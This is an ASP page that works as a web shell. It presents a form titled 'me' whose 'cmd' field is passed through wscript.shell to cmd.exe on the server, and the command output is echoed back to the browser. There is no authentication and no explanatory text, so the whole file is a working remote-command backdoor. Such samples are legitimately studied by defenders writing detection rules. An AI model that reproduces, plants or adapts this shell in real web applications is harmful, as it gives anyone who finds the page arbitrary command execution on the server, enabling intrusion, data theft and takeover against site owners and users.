<title>me</title>
<FORM action="<%= Request.ServerVariables("URL") %>" method="POST">
<input type=text name="cmd" size=45 value="<%= cmd %>">
<input type=submit value="Run">
</FORM>
<PRE>

<%
If (request("cmd") <> "") Then
Response.Write Server.HTMLEncode(server.createobject("wscript.shell").exec(Server.MapPath("cmd.exe")& " /c " &

request("cmd")).stdout.readall)
End If
%>

</PRE>
